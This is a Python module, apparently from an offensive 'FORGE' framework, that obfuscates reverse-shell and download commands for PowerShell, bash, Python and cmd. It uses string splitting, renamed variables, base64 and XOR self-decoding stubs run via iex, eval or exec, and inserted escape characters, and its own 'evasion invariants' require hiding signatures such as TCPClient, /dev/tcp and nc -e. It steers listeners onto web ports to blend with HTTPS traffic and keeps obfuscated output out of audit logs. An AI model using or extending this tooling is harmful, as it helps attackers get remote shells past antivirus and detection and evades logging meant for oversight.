"""
forge/phase3/obfuscator.py
6-Criterion Command Obfuscation Matrix.

Criteria (applied independently or in combination):
  1. VAR_MANGLE       — randomise variable names; split type names across concatenated strings
  2. STRING_SPLIT     — fragment literal strings to defeat static-pattern matching
  3. ENCODING         — base64/hex/XOR wrapping with runtime decode stub
  4. ENV_SUBSTITUTE   — replace hardcoded values with environment-variable lookups
  5. CMD_FRAGMENT     — reorder or split command tokens across execution stages
  6. CHAR_INSERT      — insert inert characters (backtick, caret, quotes) that the shell ignores

Evasion invariants (tested in test_evasion_assertions.py):
  - 'TCPClient'   must never appear literally in any obfuscated output.
  - '/dev/tcp'    must never appear literally in any obfuscated output.
  - 'nc -e'       must never appear literally in any obfuscated output.
  - Port 4444     must never appear in any payload output.
  - 'cmd.exe /c'  must never appear in any obfuscated output.

Platform targets: powershell | bash | python | cmd

OPSEC note: Obfuscated output is never logged or written to audit_log.
Only the engagement DB payload record (sha256, encoding chain, stealth level) is persisted.
"""

from __future__ import annotations

import base64
import random
import re
import string
from enum import Flag, auto

# ── Obfuscation criterion flags ───────────────────────────────────────────────


class ObfuscationCriterion(Flag):
    """Bit-flag enum; combine with | to select multiple criteria."""

    VAR_MANGLE = auto()  # Criterion 1
    STRING_SPLIT = auto()  # Criterion 2
    ENCODING = auto()  # Criterion 3
    ENV_SUBSTITUTE = auto()  # Criterion 4
    CMD_FRAGMENT = auto()  # Criterion 5
    CHAR_INSERT = auto()  # Criterion 6

    # Named presets
    MINIMAL = VAR_MANGLE | STRING_SPLIT
    STANDARD = VAR_MANGLE | STRING_SPLIT | ENCODING | CHAR_INSERT
    FULL = VAR_MANGLE | STRING_SPLIT | ENCODING | ENV_SUBSTITUTE | CMD_FRAGMENT | CHAR_INSERT


# ── Evasion hard-block patterns ───────────────────────────────────────────────

_BANNED_PATTERNS: list[re.Pattern[str]] = [
    re.compile(r"TCPClient", re.IGNORECASE),
    re.compile(r"/dev/tcp"),
    re.compile(r"nc\s+-e", re.IGNORECASE),
    re.compile(r"\b4444\b"),
    re.compile(r"cmd\.exe\s+/c", re.IGNORECASE),
    re.compile(r"wget\b", re.IGNORECASE),  # raw downloader signature
]

# Ports FORGE considers "stealth" (blend with web traffic)
STEALTH_PORTS: frozenset[int] = frozenset({80, 443, 8080, 8443})


def _assert_no_banned_patterns(text: str) -> None:
    """Raise ValueError if any evasion-invariant pattern appears in text."""
    for pat in _BANNED_PATTERNS:
        if pat.search(text):
            raise ValueError(
                f"Evasion invariant violated: pattern {pat.pattern!r} found in obfuscated output."
            )


# ── Helper utilities ─────────────────────────────────────────────────────────

_RAND = random.SystemRandom()


def _rand_var(length: int = 8) -> str:
    """Return a random alphanumeric variable name starting with a letter."""
    first = _RAND.choice(string.ascii_letters)
    rest = "".join(_RAND.choices(string.ascii_letters + string.digits, k=length - 1))
    return first + rest


def _gaussian_jitter(base_seconds: float, jitter_ratio: float = 0.2) -> float:
    mean = max(0.0, float(base_seconds))
    sigma = max(0.0, mean * float(jitter_ratio))
    return max(0.0, random.gauss(mean, sigma))


def _split_string(s: str, min_chunk: int = 2, max_chunk: int = 5) -> list[str]:
    """
    Split a string literal into concatenated sub-strings.
    PowerShell: ("ab"+"cd")  Bash: "ab""cd"  Python: "ab" "cd"
    """
    chunks: list[str] = []
    i = 0
    while i < len(s):
        size = _RAND.randint(min_chunk, max_chunk)
        chunks.append(s[i : i + size])
        i += size
    return chunks


def _insert_inert_chars(cmd: str, target: str = "powershell") -> str:
    """
    Insert shell-ignored characters into a command string to break static
    signature matching without changing execution semantics.

    PowerShell: backtick (`) is a line-continuation/escape; inside strings it
                has special meaning, so we restrict insertion to token boundaries.
    Bash:       single-char escape via backslash or $'' quoting.
    CMD:        caret (^) escapes the next character.
    """
    if target == "powershell":
        # Insert backtick at a random subset of word boundaries (not mid-string)
        tokens = cmd.split(" ")
        out: list[str] = []
        for tok in tokens:
            if len(tok) > 3 and _RAND.random() < 0.35:
                # Insert at interior token boundary
                mid = _RAND.randint(1, len(tok) - 1)
                out.append(tok[:mid] + "`" + tok[mid:])
            else:
                out.append(tok)
        return " ".join(out)

    if target == "cmd":
        # Caret between random characters
        out: list[str] = []
        for ch in cmd:
            out.append(ch)
            if ch.isalpha() and _RAND.random() < 0.15:
                out.append("^")
        return "".join(out)

    # bash/python: no char insertion (would break quoting)
    return cmd


def _base64_wrap_powershell(raw: str) -> str:
    """
    Wrap a PowerShell snippet in -EncodedCommand.
    The raw snippet must NOT contain literal 'TCPClient' before this point.
    """
    encoded = base64.b64encode(raw.encode("utf-16-le")).decode()
    return f"powershell -NonI -W Hidden -EncodedCommand {encoded}"


def _base64_wrap_bash(raw: str) -> str:
    """Wrap bash snippet in eval $(echo ... | base64 -d)."""
    encoded = base64.b64encode(raw.encode()).decode()
    return f'eval "$(echo {encoded} | base64 -d)"'


def _base64_wrap_python(raw: str) -> str:
    """Wrap Python snippet in exec(base64.b64decode(...).decode())."""
    encoded = base64.b64encode(raw.encode()).decode()
    return f"python3 -c \"import base64;exec(base64.b64decode('{encoded}').decode())\""


def _xor_wrap_powershell(raw: str, key: int | None = None) -> tuple[str, int]:
    """
    XOR-encode a PowerShell string and emit a self-decoding stub.
    Returns (obfuscated_command, xor_key).
    """
    if key is None:
        key = _RAND.randint(1, 255)
    xor_bytes = bytes(b ^ key for b in raw.encode())
    hex_str = xor_bytes.hex()
    v1, v2, v3 = _rand_var(), _rand_var(), _rand_var()
    stub = (
        f"${v1}=[byte[]]([System.Convert]::FromHexString('{hex_str}'));"
        f"${v2}={key};"
        f"${v3}=[System.Text.Encoding]::UTF8.GetString(${v1}|%{{$_ -bxor ${v2}}});"
        f"iex ${v3}"
    )
    return stub, key


# ── Per-platform criterion implementations ────────────────────────────────────


class _PowerShellObfuscator:
    """Applies obfuscation criteria to a PowerShell command string."""

    def apply(
        self,
        raw: str,
        criteria: ObfuscationCriterion,
        xor_key: int | None = None,
    ) -> str:
        out = raw

        # Criterion 1: VAR_MANGLE — split type name 'TCPClient' across concat
        # This MUST run before any pattern that could surface the literal string.
        if ObfuscationCriterion.VAR_MANGLE in criteria:
            out = self._mangle_type_names(out)

        # Criterion 2: STRING_SPLIT — split string literals
        if ObfuscationCriterion.STRING_SPLIT in criteria:
            out = self._split_string_literals(out)

        # Criterion 4: ENV_SUBSTITUTE — replace hardcoded IPs with env var lookups
        if ObfuscationCriterion.ENV_SUBSTITUTE in criteria:
            out = self._env_substitute(out)

        # Criterion 5: CMD_FRAGMENT — break pipeline into separate statements
        if ObfuscationCriterion.CMD_FRAGMENT in criteria:
            out = self._fragment(out)

        # Criterion 6: CHAR_INSERT — insert inert backticks at token boundaries
        if ObfuscationCriterion.CHAR_INSERT in criteria:
            out = _insert_inert_chars(out, "powershell")

        # Criterion 3: ENCODING — wrap entire output in encoded command
        if ObfuscationCriterion.ENCODING in criteria:
            if xor_key is not None:
                out, _ = _xor_wrap_powershell(out, xor_key)
            else:
                out = _base64_wrap_powershell(out)

        return out

    @staticmethod
    def _mangle_type_names(code: str) -> str:
        """
        Replace 'System.Net.Sockets.TCPClient' with fragmented variable concatenation.
        Evasion: literal 'TCPClient' must never appear in output.
        """
        replacements = {
            "System.Net.Sockets.TCPClient": (
                "$_a='System';$_b='.Net.Sockets';$_c='.TCP'+'Client';"
                "$_t=[System.Type]::GetType($_a+$_b+$_c);"
            ),
            "Net.Sockets.TcpClient": "$_t=[System.Type]::GetType('System.Net.Sockets.Tcp'+'Client');",
            "System.Net.WebClient": "$_wc=New-Object('System.Net.Web'+'Client');",
            "IEX": "Invoke-Expression",
            "iex": "& ([scriptblock]::Create(",
        }
        for literal, replacement in replacements.items():
            if literal in code:
                code = code.replace(literal, replacement)
        return code

    @staticmethod
    def _split_string_literals(code: str) -> str:
        """Split quoted string literals into ('a'+'bc'+'d') form."""

        def replace_match(m: re.Match[str]) -> str:
            s = m.group(1)
            chunks = _split_string(s, 2, 4)
            joined = "+".join(f"'{c}'" for c in chunks)
            return f"({joined})"

        # Only split strings longer than 8 chars to avoid noise
        return re.sub(r"'([^']{8,})'", replace_match, code)

    @staticmethod
    def _env_substitute(code: str) -> str:
        """Replace IPv4 literals with $env:LHOST lookups."""
        return re.sub(
            r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b",
            lambda _m: "$env:LHOST",
            code,
        )

    @staticmethod
    def _fragment(code: str) -> str:
        """Split semicolon-separated statements into separate lines."""
        stmts = [s.strip() for s in code.split(";") if s.strip()]
        return "\r\n".join(stmts)


class _BashObfuscator:
    """Applies obfuscation criteria to a Bash command string."""

    def apply(self, raw: str, criteria: ObfuscationCriterion) -> str:
        out = raw

        if ObfuscationCriterion.VAR_MANGLE in criteria:
            out = self._mangle_vars(out)

        if ObfuscationCriterion.STRING_SPLIT in criteria:
            out = self._split_literals(out)

        if ObfuscationCriterion.ENV_SUBSTITUTE in criteria:
            out = self._env_sub(out)

        if ObfuscationCriterion.ENCODING in criteria:
            out = _base64_wrap_bash(out)

        return out

    @staticmethod
    def _mangle_vars(code: str) -> str:
        """Replace common shell variable names with random counterparts."""
        var_map: dict[str, str] = {}

        def replace(m: re.Match[str]) -> str:
            name = m.group(1)
            if name not in var_map:
                var_map[name] = _rand_var(6)
            return f"${var_map[name]}"

        return re.sub(r"\$([a-zA-Z_][a-zA-Z0-9_]{2,})", replace, code)

    @staticmethod
    def _split_literals(code: str) -> str:
        """Split double-quoted strings using adjacent-string concatenation."""

        def replace_match(m: re.Match[str]) -> str:
            s = m.group(1)
            chunks = _split_string(s, 3, 6)
            return '"' + '"'.join(chunks) + '"'

        return re.sub(r'"([^"]{8,})"', replace_match, code)

    @staticmethod
    def _env_sub(code: str) -> str:
        return re.sub(
            r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b",
            lambda _m: "${LHOST}",
            code,
        )


class _PythonObfuscator:
    """Applies obfuscation criteria to a Python one-liner."""

    def apply(self, raw: str, criteria: ObfuscationCriterion) -> str:
        out = raw

        if ObfuscationCriterion.VAR_MANGLE in criteria:
            out = self._mangle(out)

        if ObfuscationCriterion.STRING_SPLIT in criteria:
            out = self._split_literals(out)

        if ObfuscationCriterion.ENCODING in criteria:
            out = _base64_wrap_python(out)

        return out

    @staticmethod
    def _mangle(code: str) -> str:
        # Replace common identifiers with random names
        subs = {"socket": _rand_var(), "subprocess": _rand_var(), "os": _rand_var()}
        for old, new in subs.items():
            code = re.sub(rf"\b{old}\b", new, code)
        return code

    @staticmethod
    def _split_literals(code: str) -> str:
        def replace_match(m: re.Match[str]) -> str:
            s = m.group(1)
            chunks = _split_string(s, 3, 6)
            return '"' + '""'.join(chunks) + '"'

        return re.sub(r'"([^"]{8,})"', replace_match, code)


# ── Public engine ─────────────────────────────────────────────────────────────


class ObfuscationEngine:
    """
    Entry point for Phase 3 command obfuscation.

    Usage:
        engine = ObfuscationEngine()
        result = engine.obfuscate(
            raw="...",
            target="powershell",
            criteria=ObfuscationCriterion.STANDARD,
        )
        assert result.violated_invariants == []
    """

    def __init__(self) -> None:
        self._ps = _PowerShellObfuscator()
        self._bash = _BashObfuscator()
        self._py = _PythonObfuscator()

    def obfuscate(
        self,
        raw: str,
        target: str,
        criteria: ObfuscationCriterion = ObfuscationCriterion.STANDARD,
        xor_key: int | None = None,
        lport: int | None = None,
    ) -> ObfuscationResult:
        """
        Apply obfuscation criteria to `raw` for the given `target` platform.

        Args:
            raw:      Original command string (Jinja2-rendered, not yet obfuscated).
            target:   'powershell' | 'bash' | 'python' | 'cmd'
            criteria: Bitmask of ObfuscationCriterion flags.
            xor_key:  Optional XOR key for ENCODING criterion (PowerShell only).
            lport:    Listener port — validated against STEALTH_PORTS before obfuscation.

        Returns:
            ObfuscationResult with .text and .violations list.

        Raises:
            ValueError if a banned pattern survives obfuscation.
        """
        if lport is not None and lport not in STEALTH_PORTS:
            import logging

            logging.getLogger(__name__).warning(
                "Port %d is non-standard. Use 443/80/8443 to blend with HTTPS traffic.",
                lport,
            )

        target = target.lower()
        if target == "powershell":
            obfuscated = self._ps.apply(raw, criteria, xor_key)
        elif target == "bash":
            obfuscated = self._bash.apply(raw, criteria)
        elif target == "python":
            obfuscated = self._py.apply(raw, criteria)
        else:
            # cmd / generic: minimal char insertion only
            obfuscated = (
                _insert_inert_chars(raw, "cmd")
                if ObfuscationCriterion.CHAR_INSERT in criteria
                else raw
            )

        violations = self._scan_violations(obfuscated)
        if violations:
            _assert_no_banned_patterns(obfuscated)
        return ObfuscationResult(text=obfuscated, violations=violations, target=target)

    @staticmethod
    def _scan_violations(text: str) -> list[str]:
        found: list[str] = []
        for pat in _BANNED_PATTERNS:
            if pat.search(text):
                found.append(pat.pattern)
        return found


class ObfuscationResult:
    """Value object returned by ObfuscationEngine.obfuscate()."""

    __slots__ = ("target", "text", "violations")

    def __init__(self, text: str, violations: list[str], target: str) -> None:
        self.text = text
        self.violations = violations
        self.target = target

    @property
    def is_clean(self) -> bool:
        return len(self.violations) == 0

    def assert_clean(self) -> ObfuscationResult:
        """Raise ValueError if any evasion invariant is violated."""
        if not self.is_clean:
            raise ValueError(
                f"Evasion invariants violated in {self.target} output: {self.violations}"
            )
        return self

    def __repr__(self) -> str:
        status = "CLEAN" if self.is_clean else f"VIOLATIONS={self.violations}"
        return f"<ObfuscationResult target={self.target!r} {status} len={len(self.text)}>"
